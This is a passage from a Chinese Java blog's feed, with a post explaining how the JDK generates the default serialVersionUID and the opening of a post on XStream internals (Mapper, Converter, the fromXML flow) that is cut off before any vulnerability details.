      &lt;h1 id=&quot;序言&quot;&gt;&lt;a href=&quot;#序言&quot; class=&quot;headerlink&quot; title=&quot;序言&quot;&gt;&lt;/a&gt;序言&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;浮云游子意，落日故人情。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;填Shiro的坑。&lt;/p&gt;
    
    </summary>
    
    
      <category term="Java" scheme="https://0range228.github.io/categories/Java/"/>
    
    
      <category term="shiro" scheme="https://0range228.github.io/tags/shiro/"/>
    
  </entry>
  
  <entry>
    <title>serialVersionUID的那些事</title>
    <link href="https://0range228.github.io/serialVersionUID%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B/"/>
    <id>https://0range228.github.io/serialVersionUID%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B/</id>
    <published>2021-07-28T05:50:42.000Z</published>
    <updated>2021-07-28T06:24:16.977Z</updated>
    
    <content type="html"><![CDATA[<h1 id="序言"><a href="#序言" class="headerlink" title="序言"></a>序言</h1><blockquote><p>老至居人下，春归在客先。</p></blockquote><p>serialVersionUID，有点东西。</p><a id="more"></a><h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>在前两篇文章的基础上，我们知道了序列化就是把对象转化为字节流，反序列化就是将字节流还原为内存对象。</p><p>在进行反序列化时，JVM会把传来的字节流中的serialVersionUID与本地相应实体类的serialVersionUID进行比较，如果相同就认为是一致的，可以进行反序列化，否则就会出现序列化版本不一致的异常，即是InvalidCastException。</p><p>总体来说：<strong>serialVersionUID的作用就是维护两端类文件的版本一致性。</strong></p><p>serialVersionUID有两种显示的生成方式：   </p><p>一是默认的1L，比如：private static final long serialVersionUID = 1L；</p><p>二是根据类名、接口名、成员方法及属性等来生成一个64位的哈希字段；</p><h1 id="由来"><a href="#由来" class="headerlink" title="由来"></a>由来</h1><p>serialVersionUID如果我们没有显示赋值，那他是如何生成的呢？</p><p>来到序列化流程中writeNonProxy方法中的getSerialVersionUID：</p><img src="../images/serialVersionUID%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B/image-20210728140147771.png" alt="image-20210728140147771" style="zoom:50%;"><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">long</span> <span class="title">getSerialVersionUID</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// REMIND: synchronize instead of relying on volatile?</span></span><br><span class="line">    <span class="keyword">if</span> (suid == <span class="keyword">null</span>) &#123;</span><br><span class="line">      <span class="comment">// 使用了一个内部类的方式，使用特权计算computeDefaultSUID():</span></span><br><span class="line">        suid = AccessController.doPrivileged(</span><br><span class="line">            <span class="keyword">new</span> PrivilegedAction&lt;Long&gt;() &#123;</span><br><span class="line">                <span class="function"><span class="keyword">public</span> Long <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                    <span class="keyword">return</span> computeDefaultSUID(cl);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> suid.longValue();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们进入computeDefaultSUID方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">long</span> <span class="title">computeDefaultSUID</span><span class="params">(Class&lt;?&gt; cl)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 代理</span></span><br><span class="line">    <span class="keyword">if</span> (!Serializable<span class="class">.<span class="keyword">class</span>.<span class="title">isAssignableFrom</span>(<span class="title">cl</span>) || <span class="title">Proxy</span>.<span class="title">isProxyClass</span>(<span class="title">cl</span>))</span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0L</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        ByteArrayOutputStream bout = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        DataOutputStream dout = <span class="keyword">new</span> DataOutputStream(bout);</span><br><span class="line">        <span class="comment">// 类名</span></span><br><span class="line">        dout.writeUTF(cl.getName());</span><br><span class="line">      </span><br><span class="line">        <span class="comment">// 修饰符</span></span><br><span class="line">        <span class="keyword">int</span> classMods = cl.getModifiers() &amp;</span><br><span class="line">            (Modifier.PUBLIC | Modifier.FINAL |</span><br><span class="line">             Modifier.INTERFACE | Modifier.ABSTRACT);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//  方法</span></span><br><span class="line">        Method[] methods = cl.getDeclaredMethods();</span><br><span class="line">        <span class="keyword">if</span> ((classMods &amp; Modifier.INTERFACE) != <span class="number">0</span>) &#123;</span><br><span class="line">            classMods = (methods.length &gt; <span class="number">0</span>) ?</span><br><span class="line">                (classMods | Modifier.ABSTRACT) :</span><br><span class="line">                (classMods &amp; ~Modifier.ABSTRACT);</span><br><span class="line">        &#125;</span><br><span class="line">        dout.writeInt(classMods);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!cl.isArray()) &#123;</span><br><span class="line">            <span class="comment">// 继承的接口</span></span><br><span class="line">            Class&lt;?&gt;[] interfaces = cl.getInterfaces();</span><br><span class="line">            String[] ifaceNames = <span class="keyword">new</span> String[interfaces.length];</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; interfaces.length; i++) &#123;</span><br><span class="line">                ifaceNames[i] = interfaces[i].getName();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 接口名</span></span><br><span class="line">            Arrays.sort(ifaceNames);</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; ifaceNames.length; i++) &#123;</span><br><span class="line">                dout.writeUTF(ifaceNames[i]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 全部属性</span></span><br><span class="line">        Field[] fields = cl.getDeclaredFields();</span><br><span class="line">        MemberSignature[] fieldSigs = <span class="keyword">new</span> MemberSignature[fields.length];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; fields.length; i++) &#123;</span><br><span class="line">            fieldSigs[i] = <span class="keyword">new</span> MemberSignature(fields[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        Arrays.sort(fieldSigs, <span class="keyword">new</span> Comparator&lt;MemberSignature&gt;() &#123;</span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">compare</span><span class="params">(MemberSignature ms1, MemberSignature ms2)</span> </span>&#123;</span><br><span class="line">                <span class="keyword">return</span> ms1.name.compareTo(ms2.name);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; fieldSigs.length; i++) &#123;</span><br><span class="line">            <span class="comment">// 成员签名</span></span><br><span class="line">            MemberSignature sig = fieldSigs[i];</span><br><span class="line">            <span class="keyword">int</span> mods = sig.member.getModifiers() &amp;</span><br><span class="line">                (Modifier.PUBLIC | Modifier.PRIVATE | Modifier.PROTECTED |</span><br><span class="line">                 Modifier.STATIC | Modifier.FINAL | Modifier.VOLATILE |</span><br><span class="line">                 Modifier.TRANSIENT);</span><br><span class="line">            <span class="keyword">if</span> (((mods &amp; Modifier.PRIVATE) == <span class="number">0</span>) ||</span><br><span class="line">                ((mods &amp; (Modifier.STATIC | Modifier.TRANSIENT)) == <span class="number">0</span>))</span><br><span class="line">            &#123;</span><br><span class="line">                dout.writeUTF(sig.name);</span><br><span class="line">                dout.writeInt(mods);</span><br><span class="line">                dout.writeUTF(sig.signature);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 是否有静态初始化</span></span><br><span class="line">        <span class="keyword">if</span> (hasStaticInitializer(cl)) &#123;</span><br><span class="line">            dout.writeUTF(<span class="string">"&lt;clinit&gt;"</span>);</span><br><span class="line">            dout.writeInt(Modifier.STATIC);</span><br><span class="line">            dout.writeUTF(<span class="string">"()V"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 构造器</span></span><br><span class="line">        Constructor&lt;?&gt;[] cons = cl.getDeclaredConstructors();</span><br><span class="line">        MemberSignature[] consSigs = <span class="keyword">new</span> MemberSignature[cons.length];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; cons.length; i++) &#123;</span><br><span class="line">            consSigs[i] = <span class="keyword">new</span> MemberSignature(cons[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        Arrays.sort(consSigs, <span class="keyword">new</span> Comparator&lt;MemberSignature&gt;() &#123;</span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">compare</span><span class="params">(MemberSignature ms1, MemberSignature ms2)</span> </span>&#123;</span><br><span class="line">                <span class="keyword">return</span> ms1.signature.compareTo(ms2.signature);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; consSigs.length; i++) &#123;</span><br><span class="line">            MemberSignature sig = consSigs[i];</span><br><span class="line">            <span class="keyword">int</span> mods = sig.member.getModifiers() &amp;</span><br><span class="line">                (Modifier.PUBLIC | Modifier.PRIVATE | Modifier.PROTECTED |</span><br><span class="line">                 Modifier.STATIC | Modifier.FINAL |</span><br><span class="line">                 Modifier.SYNCHRONIZED | Modifier.NATIVE |</span><br><span class="line">                 Modifier.ABSTRACT | Modifier.STRICT);</span><br><span class="line">            <span class="keyword">if</span> ((mods &amp; Modifier.PRIVATE) == <span class="number">0</span>) &#123;</span><br><span class="line">                dout.writeUTF(<span class="string">"&lt;init&gt;"</span>);</span><br><span class="line">                dout.writeInt(mods);</span><br><span class="line">                dout.writeUTF(sig.signature.replace(<span class="string">'/'</span>, <span class="string">'.'</span>));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        MemberSignature[] methSigs = <span class="keyword">new</span> MemberSignature[methods.length];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; methods.length; i++) &#123;</span><br><span class="line">            methSigs[i] = <span class="keyword">new</span> MemberSignature(methods[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        Arrays.sort(methSigs, <span class="keyword">new</span> Comparator&lt;MemberSignature&gt;() &#123;</span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">compare</span><span class="params">(MemberSignature ms1, MemberSignature ms2)</span> </span>&#123;</span><br><span class="line">                <span class="keyword">int</span> comp = ms1.name.compareTo(ms2.name);</span><br><span class="line">                <span class="keyword">if</span> (comp == <span class="number">0</span>) &#123;</span><br><span class="line">                    comp = ms1.signature.compareTo(ms2.signature);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> comp;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; methSigs.length; i++) &#123;</span><br><span class="line">            MemberSignature sig = methSigs[i];</span><br><span class="line">            <span class="keyword">int</span> mods = sig.member.getModifiers() &amp;</span><br><span class="line">                (Modifier.PUBLIC | Modifier.PRIVATE | Modifier.PROTECTED |</span><br><span class="line">                 Modifier.STATIC | Modifier.FINAL |</span><br><span class="line">                 Modifier.SYNCHRONIZED | Modifier.NATIVE |</span><br><span class="line">                 Modifier.ABSTRACT | Modifier.STRICT);</span><br><span class="line">            <span class="keyword">if</span> ((mods &amp; Modifier.PRIVATE) == <span class="number">0</span>) &#123;</span><br><span class="line">                dout.writeUTF(sig.name);</span><br><span class="line">                dout.writeInt(mods);</span><br><span class="line">                dout.writeUTF(sig.signature.replace(<span class="string">'/'</span>, <span class="string">'.'</span>));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        dout.flush();</span><br><span class="line"><span class="comment">// 哈希操作，返回结果就是serialVersionUID</span></span><br><span class="line">        MessageDigest md = MessageDigest.getInstance(<span class="string">"SHA"</span>);</span><br><span class="line">        <span class="keyword">byte</span>[] hashBytes = md.digest(bout.toByteArray());</span><br><span class="line">        <span class="keyword">long</span> hash = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = Math.min(hashBytes.length, <span class="number">8</span>) - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">            hash = (hash &lt;&lt; <span class="number">8</span>) | (hashBytes[i] &amp; <span class="number">0xFF</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> hash;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException ex) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> InternalError(ex);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (NoSuchAlgorithmException ex) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> SecurityException(ex.getMessage());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到，serialVersionUID是由将类名，属性名，属性修饰符，继承的接口，属性类型，名称，方法，静态代码块等等这些都考虑进去了。</p><h1 id="区别"><a href="#区别" class="headerlink" title="区别"></a>区别</h1><p>假设现在A、B双方准备进行序列化交互，A序列化，B反序列化，双方机器上都有Student类：</p><ul><li><p>情景1：双方都利用系统默认生成的serialVersionUID。</p><p>如果这时候A决定为Student增加/缺少字段，此时B再反序列化会<strong>报错</strong>。</p><p>因为此时A、B两台机器上的Student类已经版本不一致了。</p></li><li><p>情景2：双方协商好使用统一的serialVersionUID。</p><p>这样如果A决定为Student增加/缺少字段，此时B再反序列化<strong>不会报错</strong>。</p><p>对于增加的字段。会根据类型赋给他初始值。</p></li></ul><p>原因：</p><p>自动生成的，由于类文件变化，它也会跟着发生变化，会出现版本不一致的问题，导致反序列化失败。</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;序言&quot;&gt;&lt;a href=&quot;#序言&quot; class=&quot;headerlink&quot; title=&quot;序言&quot;&gt;&lt;/a&gt;序言&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;老至居人下，春归在客先。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;serialVersionUID，有点东西。&lt;/p&gt;
    
    </summary>
    
    
      <category term="Java" scheme="https://0range228.github.io/categories/Java/"/>
    
    
      <category term="Java序列化原理" scheme="https://0range228.github.io/tags/Java%E5%BA%8F%E5%88%97%E5%8C%96%E5%8E%9F%E7%90%86/"/>
    
  </entry>
  
  <entry>
    <title>XStream反序列化漏洞梳理</title>
    <link href="https://0range228.github.io/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%A2%B3%E7%90%86/"/>
    <id>https://0range228.github.io/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%A2%B3%E7%90%86/</id>
    <published>2021-07-27T08:20:37.000Z</published>
    <updated>2021-08-27T09:07:13.864Z</updated>
    
    <content type="html"><![CDATA[<h1 id="序言"><a href="#序言" class="headerlink" title="序言"></a>序言</h1><blockquote><p>百川东到海，何时复西归？</p></blockquote><p>这一篇来梳理XStream不同版本的花式RCE，也会是补全计划的一部分。    </p><a id="more"></a><h1 id="老实本分的XStream"><a href="#老实本分的XStream" class="headerlink" title="老实本分的XStream"></a>老实本分的XStream</h1><p>XStream格局可以的，直接把自己的<a href="https://x-stream.github.io/security.html" target="_blank" rel="noopener">List&lt; CVE &gt;</a>放在了首页</p><img src="../images/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%A2%B3%E7%90%86/image-20210727162943451.png" alt="image-20210727162943451" style="zoom:50%;"><p>会按照时间线逐个梳理。</p><p>基本API操作：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">XStream xStream = <span class="keyword">new</span> XStream();</span><br><span class="line">Person person = <span class="keyword">new</span> Person(<span class="string">"peter"</span>,<span class="number">18</span>);</span><br><span class="line"><span class="comment">// object to xml</span></span><br><span class="line">String xml = xStream.toXML(person);</span><br><span class="line"><span class="comment">// xml to object</span></span><br><span class="line">Object o = xStream.fromXML(xml);</span><br></pre></td></tr></table></figure><h1 id="重要组件"><a href="#重要组件" class="headerlink" title="重要组件"></a>重要组件</h1><p>XStream类图，参考<a href="https://www.jianshu.com/p/387c568faf62" target="_blank" rel="noopener">XStream 源码解析</a>：</p><img src="http://m0d9.me/images/pasted-136.png" alt="img" style="zoom:150%;"><p>主要分为四个部分：</p><h2 id="MarshallingStrategy"><a href="#MarshallingStrategy" class="headerlink" title="MarshallingStrategy"></a>MarshallingStrategy</h2><p>编码策略：</p><ul><li>marshall  : object-&gt;xml         编码</li><li>unmarshall :  xml-&gt; object   解码</li></ul><p>两个重要的类：</p><ul><li><p>TreeMarshaller: 树编组程序  调用Mapper和Converter把 java对象-&gt; XML</p><p>其中的start方法开始编组，convertAnother方法把java对象转化成XML。 </p></li></ul><img src="../images/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%A2%B3%E7%90%86/image-20210727192641609.png" alt="image-20210727192641609" style="zoom:50%;"><ul><li><p>TreeUnmarshaller ： 树解组程序 调用Mapper和Converter把 XML-&gt;java对象</p><p>里面的start方法开始解组，convertAnother方法把class转化成java对象。</p></li></ul><img src="../images/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%A2%B3%E7%90%86/image-20210727193134470.png" alt="image-20210727193134470" style="zoom:50%;"><h2 id="Mapper"><a href="#Mapper" class="headerlink" title="Mapper"></a>Mapper</h2><p>映射器</p><img src="../images/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%A2%B3%E7%90%86/image-20210727174404413.png" alt="image-20210727174404413" style="zoom:70%;"><p>通过mapper获取对象对应的类、成员、Field属性的Class对象，赋值给XML的标签字段。</p><h2 id="Converter"><a href="#Converter" class="headerlink" title="Converter"></a>Converter</h2><p>XStream为Java常见的类型提供了Converter转换器。转换器注册中心是XStream组成的核心部分。</p><p>Converter的职责是提供一种策略，用于将对象图中找到的特定类型的对象转换为XML或将XML转换为对象。</p><p><strong>简单地说，Xstream的思路是通过不同的converter来处理序列化数据中不同类型的数据。</strong></p><p>Converter需要实现3个方法：</p><ul><li>canConvert方法：告诉XStream对象，它能够转换的对象；</li><li>marshal方法：能够将对象转换为XML时候的具体操作；</li><li>unmarshal方法：能够将XML转换为对象时的具体操作；</li></ul><img src="../images/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%A2%B3%E7%90%86/image-20210727203831632.png" alt="image-20210727203831632" style="zoom:50%;"><img src="../images/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%A2%B3%E7%90%86/image-20210727203706224.png" alt="image-20210727203706224" style="zoom:50%;"><p><a href="http://x-stream.github.io/converters.html" target="_blank" rel="noopener">http://x-stream.github.io/converters.html</a></p><p>这里告诉了我们针对各种对象XStream做了哪些支持。</p><h1 id="XStream编组-解组具体过程"><a href="#XStream编组-解组具体过程" class="headerlink" title="XStream编组/解组具体过程"></a>XStream编组/解组具体过程</h1><p>XStream : 1.4.6</p><h2 id="fromXML"><a href="#fromXML" class="headerlink" title="fromXML"></a>fromXML</h2><p>xml-&gt;obj 先看如何反序列化出来的：</p><p>第一步：把String转化成StringReader，HierarchicalStreamDriver通过StringReader创建HierarchicalStreamReader，最后调用MarshallingStrategy的unmarshal方法开始解组</p><img src="../images/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%A2%B3%E7%90%86/image-20210727193725097.png" alt="image-20210727193725097" style="zoom:50%;"><img src="../images/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%A2%B3%E7%90%86/image-20210727193927296.png" alt="image-20210727193927296" style="zoom:50%;"><img src="../images/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%A2%B3%E7%90%86/image-20210727194042572.png" alt="image-20210727194042572" style="zoom:50%;"><p>第二步：进入start方法，开始解析：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">start</span><span class="params">(DataHolder dataHolder)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.dataHolder = dataHolder;</span><br><span class="line">  <span class="comment">//通过Mapper获取对应节点的Class对象</span></span><br><span class="line">    Class type = HierarchicalStreams.readClassType(<span class="keyword">this</span>.reader, <span class="keyword">this</span>.mapper);</span><br><span class="line">  <span class="comment">//Converter根据Class的类型转化成java对象</span></span><br><span class="line">    Object result = <span class="keyword">this</span>.convertAnother((Object)<span class="keyword">null</span>, type);</span><br><span class="line">    Iterator validations = <span class="keyword">this</span>.validationList.iterator();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(validations.hasNext()) &#123;</span><br><span class="line">        Runnable runnable = (Runnable)validations.next();</span><br><span class="line">        runnable.run();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>先看readClassType里面做了什么事情：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Class <span class="title">readClassType</span><span class="params">(HierarchicalStreamReader reader, Mapper mapper)</span> </span>&#123;</span><br><span class="line">    String classAttribute = readClassAttribute(reader, mapper);</span><br><span class="line">    Class type;</span><br><span class="line">    <span class="keyword">if</span> (classAttribute == <span class="keyword">null</span>) &#123;</span><br><span class="line">      <span class="comment">// 通过节点名获取Mapper中对应的Class对象</span></span><br><span class="line">        type = mapper.realClass(reader.getNodeName());</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        type = mapper.realClass(classAttribute);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//返回值type就是obj对应的Class对象</span></span><br><span class="line">    <span class="keyword">return</span> type;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第三步 ： convertAnother 方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">convertAnother</span><span class="params">(Object parent, Class type, Converter converter)</span> </span>&#123;</span><br><span class="line">  <span class="comment">//根据mapper获取type类对象的正确类型</span></span><br><span class="line">    type = <span class="keyword">this</span>.mapper.defaultImplementationOf(type);</span><br><span class="line">    <span class="keyword">if</span> (converter == <span class="keyword">null</span>) &#123;</span><br><span class="line">      <span class="comment">//根据type找到对应的converter</span></span><br><span class="line">        converter = <span class="keyword">this</span>.converterLookup.lookupConverterForType(type);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!converter.canConvert(type)) &#123;</span><br><span class="line">        ConversionException e = <span class="keyword">new</span> ConversionException(<span class="string">"Explicit selected converter cannot handle type"</span>);</span><br><span class="line">        e.add(<span class="string">"item-type"</span>, type.getName());</span><br><span class="line">        e.add(<span class="string">"converter-type"</span>, converter.getClass().getName());</span><br><span class="line">        <span class="keyword">throw</span> e;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.convert(parent, type, converter);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意这里参数parent，converter默认都是null</p><p>如何查找对应的converter？</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Converter <span class="title">lookupConverterForType</span><span class="params">(Class type)</span> </span>&#123;</span><br><span class="line">  <span class="comment">//先从缓存集合中查找Converter</span></span><br><span class="line">    Converter cachedConverter = (Converter)<span class="keyword">this</span>.typeToConverterMap.get(type);</span><br><span class="line">    <span class="keyword">if</span> (cachedConverter != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> cachedConverter;</span><br><span class="line">    &#125; 